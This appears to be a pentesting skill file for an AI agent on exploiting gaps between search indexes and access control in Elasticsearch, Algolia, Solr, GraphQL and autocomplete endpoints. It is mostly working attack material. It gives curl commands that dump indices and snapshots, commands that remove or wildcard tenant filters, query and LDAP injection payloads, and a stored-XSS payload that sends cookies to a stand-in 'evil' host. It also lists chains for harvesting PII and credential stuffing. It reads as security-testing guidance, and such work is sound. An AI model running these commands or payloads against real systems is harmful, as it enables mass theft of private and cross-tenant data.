---
name: search-indexing-acl
description: Search and indexing ACL desync testing for data leakage through search APIs, autocomplete, typeahead, and full-text search endpoints
depends_on: [idor]
---

# Search & Indexing ACL Desync

Search infrastructure (Elasticsearch, Algolia, Solr, internal search APIs) indexes data at write time but enforces access control at read time — or doesn't. When the indexer ingests data without respecting the application's authorization model, every search query becomes a bypass of per-object ACL. This skill covers systematic discovery and exploitation of that desync.

## Discovery Signals

| Signal | Where to Find | Why Vulnerable |
|--------|---------------|----------------|
| Autocomplete / typeahead endpoints | `/api/autocomplete`, `/suggest`, `/typeahead`, network tab on search bars | Return results from a global index without per-user filtering |
| GraphQL search resolvers | Introspection — `search`, `globalSearch`, `fullTextSearch` fields | Resolvers often skip parent-level authorization inherited by CRUD queries |
| Elasticsearch `/_search` exposed | Port 9200, path probing, Shodan `port:9200 elastic` | Direct query DSL access bypasses all application-layer ACL |
| Algolia API keys in JS bundles | `grep -r "algolia\|ALGOLIA\|algoliasearch" *.js`, view-source | Search-only keys in client JS may access indices beyond intended scope |
| Search suggestions showing private data | Type a partial username/email in any search field | Suggestion engine indexes all records, returns matches regardless of viewer |
| Global search across tenants | Multi-tenant SaaS search bars, `?q=` on dashboard endpoints | Missing `tenant_id` filter in the search query — returns cross-tenant results |
| Filtered listing with search params | `/api/users?search=`, `/api/orders?q=`, `/admin/reports?filter=` | Listing endpoints add search as a parameter, forget to re-apply row-level ACL |
| Full-text search on UGC | Comment/post/message search features | Indexes private messages, draft content, deleted items alongside public content |
| Admin search accessible to regular users | `/admin/search`, `/internal/search`, `/api/v1/search?scope=all` | Admin-scoped search endpoint lacks role check — any authenticated user queries it |
| Export/report endpoints with search | `/api/export?q=`, `/reports/generate?filter=` | Export builds a search query server-side; filter params control what's exported |

## Attack Surface

**Where search ACL breaks occur:**

- **Index-time over-inclusion**: The indexer ingests all records (including private, deleted, draft, other-tenant) into a flat index without ACL metadata. Every query hits the full corpus.
- **Query-time filter omission**: The application adds `AND tenant_id = X` to SQL queries but the search proxy forwards raw queries to Elasticsearch/Solr without appending the filter.
- **Parallel access path**: REST API enforces ownership checks, but the search endpoint queries a separate datastore (search index) that was populated by a background job with service-account privileges.
- **Stale ACL in index**: A record's permissions change (user leaves org, document marked private) but the search index retains the old document — ACL is checked against the index document, not the source of truth.
- **Client-side search keys**: Algolia/Typesense/MeiliSearch ship API keys to the browser. If the key lacks index-level or filter-level restrictions, the client can query any index or remove restrictive filters.

## High-Value Targets

| Data Type | Search Leak Vector | Impact |
|-----------|--------------------|--------|
| Emails / usernames | Autocomplete, user search, mention/tag suggestions | User enumeration, credential stuffing seed |
| Private messages / DMs | Full-text search indexing all messages | PII/PHI exposure, GDPR violation |
| Draft / unpublished content | Content search indexing all states | IP theft, premature disclosure |
| Internal documents | Enterprise search, knowledge base search | Corporate espionage, insider threat escalation |
| Financial records | Report search, transaction search | PCI data leakage, regulatory breach |
| Deleted content | Search index not purged on delete | "Right to erasure" violation, data resurrection |
| Cross-tenant records | Global search without tenant scoping | Multi-tenant data breach |
| Admin-only data | Admin search endpoint exposed to users | Privilege escalation via information |

## Key Vulnerabilities

### Elasticsearch Direct Access

Elasticsearch defaults to no authentication (pre-8.x). If reachable, full read/write.

```bash
curl -s https://target:9200/_cat/indices?v          # List all indices
curl -s https://target:9200/_mapping                # All index schemas
curl -s 'https://target:9200/users/_search?size=1000' | jq '.hits.hits[]._source'
curl -s 'https://target:9200/*/_search?q=password'   # Wildcard all indices
curl -s https://target:9200/_snapshot/_all | jq .    # Snapshot repos (full dump)
```

Also check Kibana (port 5601): `/app/discover` for raw index browsing, `/app/dev_tools` for query console.

### Algolia / Third-Party Search

```bash
grep -rE 'algolia|ALGOLIA_APP_ID|ALGOLIA_API_KEY|searchClient' app.*.js bundle.js
# Test key scope — list indices, query ones the UI doesn't expose
curl -s "https://${APP_ID}-dsn.algolia.net/1/indexes" \
  -H "X-Algolia-Application-Id: ${APP_ID}" -H "X-Algolia-API-Key: ${SEARCH_KEY}"
curl -s "https://${APP_ID}-dsn.algolia.net/1/indexes/internal_users/query" \
  -H "X-Algolia-Application-Id: ${APP_ID}" -H "X-Algolia-API-Key: ${SEARCH_KEY}" \
  -d '{"params":"query=admin&hitsPerPage=100"}'
```

**Secured API key bypass**: Algolia `securedApiKey` embeds filters (e.g., `filters=tenant_id:123`). Test: use the *parent* search key directly (found in JS/config) — it has no embedded restrictions.

### Autocomplete / Typeahead Data Leaks

Highest-yield target — built for speed, authorization is the first thing dropped for latency.

```bash
# Enumerate what autocomplete returns across prefixes
for prefix in a b admin test delete draft private; do
  curl -s "https://target.com/api/autocomplete?q=${prefix}&limit=50" | jq '.[].label' | head -5
done
# Cross-user test: create private doc as User A, search as User B
curl -s "https://target.com/api/suggest?q=private_doc_title" -H "Authorization: Bearer $OTHER_USER"
```

**Look for**: Other users' data, deleted content, draft/unpublished items, hidden-profile emails, internal records.

### Search Filter Bypass

The app appends `AND tenant_id = 123` to queries but the raw search API lets you remove or override it.

```bash
# Original: POST /api/search {"query":"test","filters":{"tenant_id":123}}
curl -X POST https://target.com/api/search -d '{"query":"test","filters":{}}'         # Remove filter
curl -X POST https://target.com/api/search -d '{"query":"test","filters":{"tenant_id":"*"}}'  # Wildcard
```

**Aggregation sidechannel**: Even when hits are filtered, aggregation queries compute across the full index:
`{"query":"*","size":0,"aggs":{"email_domains":{"terms":{"field":"email.keyword","size":100}}}}`

### GraphQL Search Exploits

```graphql
{ search(query: "confidential", types: [DOCUMENT, MESSAGE, USER]) {
    edges { node {
      ... on Document { title content owner { email } }
      ... on Message { body sender { name } }
      ... on User { email phone }
    } }
} }
```

**Pattern**: The `search` resolver queries a search index (Elasticsearch) rather than the database. Database queries have row-level security; the search index does not. Also test `allUsers(filter: { name_contains: "..." })` — connection queries with unrestricted full-text filters.

### Index Poisoning

When users can write content that gets indexed, the index becomes an injection vector.

| Technique | Payload | Impact |
|-----------|---------|--------|
| Stored XSS via search results | `<img src=x onerror=fetch('//evil/'+document.cookie)>` in a profile field | XSS fires when result is rendered in search UI |
| SEO poisoning | Spam keywords in user-controlled indexed fields | Search results polluted, phishing content ranks |
| Search result hijacking | Inject content matching high-value search terms | Victims searching for "password reset" see attacker content |
| Index bloat DoS | Submit millions of records that get indexed | Search performance degrades, storage costs spike |

## Search Query Injection

| Search Engine | Injection Technique | Payload |
|---------------|---------------------|---------|
| Elasticsearch | Query DSL via JSON body manipulation | `{"query":{"match_all":{}},"_source":["password","ssn"]}` |
| Elasticsearch | Script field injection (if scripting enabled) | `"script_fields":{"x":{"script":"doc['password'].value"}}` |
| Solr | Local parameter injection | `{!type=dismax qf=password v=*}` |
| Solr | Function query injection | `/select?q={!func}query({!dismax qf=secret_field v=*})` |
| Algolia | Filter string manipulation | Remove `filters` param or set to empty string |
| Lucene syntax | Wildcard field access | `_exists_:password OR secret_field:*` |
| LDAP search | Filter injection in directory search | `*)(|(objectClass=*` to dump full directory |
| Typesense / MeiliSearch | Filter bypass via API | Override `filter_by` param — no signature on search params |

## Bypass Techniques

```
Technique                       How It Works
────────────────────────────────────────────────────────────────
Remove tenant_id filter         Delete the filter param from search request body
Wildcard tenant override        Set tenant_id to *, 0, null, or empty string
Direct index query              Bypass application search API, hit Elasticsearch directly
API version downgrade           /api/v1/search may lack filters added in /api/v2/search
Search-key scope escalation     Use parent API key instead of restricted search-only key
Aggregation sidechannel         Request aggregations instead of hits — leaks stats on filtered data
Scroll/scan API                 POST /_search/scroll bypasses per-request size limits
Source filtering                Request _source to include fields the UI doesn't display
Nested object traversal         Query nested objects that inherit parent doc's index but not its ACL
field_caps / _mapping recon     Enumerate all indexed fields including hidden/internal ones
```

## Testing Methodology

**Step 1: Map search infrastructure**
- Identify all search endpoints (autocomplete, suggest, search, filter, export)
- Check for exposed Elasticsearch (9200), Solr (8983), Kibana (5601)
- Extract client-side search keys from JS bundles

**Step 2: Determine search backend**
- Error messages often reveal: "Elasticsearch query failed", "Solr connection refused"
- Response structure: `hits.hits[]._source` = Elasticsearch, `response.docs[]` = Solr
- Client libraries in JS: `algoliasearch`, `instantsearch.js`, `typesense`, `meilisearch`

**Step 3: Test cross-boundary access**
- Create data as User A (private doc, private message, draft post)
- Search for that data as User B — autocomplete first, then full search
- Search for that data unauthenticated
- Search for that data from a different tenant (if multi-tenant)

**Step 4: Test filter integrity**
- Intercept search request, remove all filter/scope params
- Replace tenant/user ID filters with wildcards or other tenants' IDs
- Add `_source` param to request fields the UI doesn't show

**Step 5: Test deleted/draft content**
- Delete a record, then immediately search for it
- Create a draft, search from another account
- Unpublish content, verify search index was updated

**Step 6: Test direct backend access**
- If Elasticsearch exposed: `/_cat/indices`, `/_search`, `/_mapping`
- If Solr exposed: `/solr/admin/cores`, `/solr/{core}/select?q=*:*`
- If Kibana exposed: `/app/discover`, `/app/dev_tools`

## Validation

**Proving data leakage through search:**
1. Show the data is NOT accessible via the normal API (REST/GraphQL returns 403/404)
2. Show the SAME data IS accessible via the search endpoint
3. Include the full search response proving the leaked fields
4. Demonstrate the victim's privacy setting or ACL that should prevent access
5. For cross-tenant: show tenant isolation works on normal APIs but fails on search

## False Positives

| Scenario | Why It's Not a Bug |
|----------|--------------------|
| Public profile data in autocomplete | If the data is publicly visible on profiles, search returning it is intended |
| Search returns your own private data | Search is expected to return the searcher's own content |
| Admin search returns all data when used by admin | Admin-scoped endpoints returning admin-visible data is correct |
| Elasticsearch on internal network only | If 9200 is not internet-reachable and requires VPN, severity drops to internal |
| Search key with proper secured filters | If the Algolia key has correctly scoped `filters` that cannot be overridden |
| Autocomplete for public entities only | Entity search limited to public orgs/repos/channels is expected |

## Impact

| Scenario | Severity | Justification |
|----------|----------|---------------|
| Cross-tenant data via search | Critical | Full tenant isolation breach — multi-tenant SaaS death sentence |
| PII/PHI in autocomplete (emails, health data) | High | Regulatory exposure (GDPR, HIPAA), mass data harvesting |
| Private messages / DMs via search | High | Confidentiality breach, potential blackmail material |
| Exposed Elasticsearch with PII indices | High-Critical | Full database equivalent access without authentication |
| Deleted content in search results | Medium | Right-to-erasure (GDPR Art. 17) violation |
| User enumeration via autocomplete | Medium | Enables credential stuffing, targeted phishing |
| Draft/unpublished content leak | Medium | IP exposure, premature disclosure |
| Index poisoning / stored XSS via search | Medium-High | Stored XSS at scale — every searcher is a victim |

## Chain Patterns

| Chain | Steps | Combined Severity |
|-------|-------|-------------------|
| Search ACL bypass → PII harvest | 1. Find unscoped search endpoint 2. Query for `email:*` or `phone:*` 3. Paginate full user list | High → Critical (mass PII) |
| Autocomplete → user enum → credential stuffing | 1. Enumerate valid emails via typeahead 2. Feed to credential stuffing tool 3. Account takeover | Medium → High (ATO at scale) |
| Index poisoning → stored XSS | 1. Inject XSS payload in indexed field 2. Victim searches, result renders payload 3. Session hijack | Medium → High (stored XSS) |
| Search filter bypass → bulk export | 1. Remove tenant filter from search 2. Set `size=10000` 3. Scroll through full index | Medium → Critical (full data exfil) |
| Autocomplete → private data → social engineering | 1. Leak internal project names via search 2. Use names in spear-phishing emails 3. Credential harvest | Low → Medium (targeted phish) |
| Exposed Elasticsearch → snapshot restore → full dump | 1. Find /_snapshot repos 2. Restore snapshot to temp index 3. Dump all data | High → Critical (full backup access) |
| GraphQL search → IDOR chain | 1. Search returns object IDs the user shouldn't see 2. Use leaked IDs on REST endpoints lacking ownership check | Medium → High (data + action) |

## Pro Tips

1. **Autocomplete first, full search second** — autocomplete endpoints are built for speed, authorization is the first thing dropped for latency. Test typeahead before investing in full search exploitation.
2. **Watch the network tab during search** — modern SPAs send search requests as you type. The raw request often reveals the search backend, index names, and filter structure before you send a single manual request.
3. **Compare search results to API results** — if `/api/users/123` returns 403 but `/api/search?q=user123` returns their data, that's the desync. The two-path comparison is the core proof.
4. **Algolia keys are almost always in the JS bundle** — search for `algolia`, `NEXT_PUBLIC_ALGOLIA`, `searchClient` in page source. The search-only key is expected to be public, but test if it can access unintended indices or lacks filter restrictions.
5. **Aggregations leak when hits don't** — even if search results are properly filtered, aggregation queries (terms, histogram, cardinality) compute across the full unfiltered index. Request `"size":0,"aggs":{...}` to extract statistics without returning documents.
6. **Scroll API bypasses size limits** — `POST /_search/scroll` with a scroll ID lets you paginate through the entire index. Application-level pagination limits don't apply to the scroll context.
7. **Test immediately after permission changes** — change a document from public to private, then search instantly. Index lag (seconds to minutes) means the search index serves stale data with old permissions.
8. **Deleted records persist in search** — most apps delete from the database but forget to delete from the search index. Search for recently deleted content within minutes of deletion.

## Summary

Search infrastructure is a parallel data access path that bypasses application-layer ACL. The core test is: can a user find data via search that they cannot access via the direct API? Autocomplete endpoints, exposed search backends, and client-side search keys are the three highest-yield entry points.
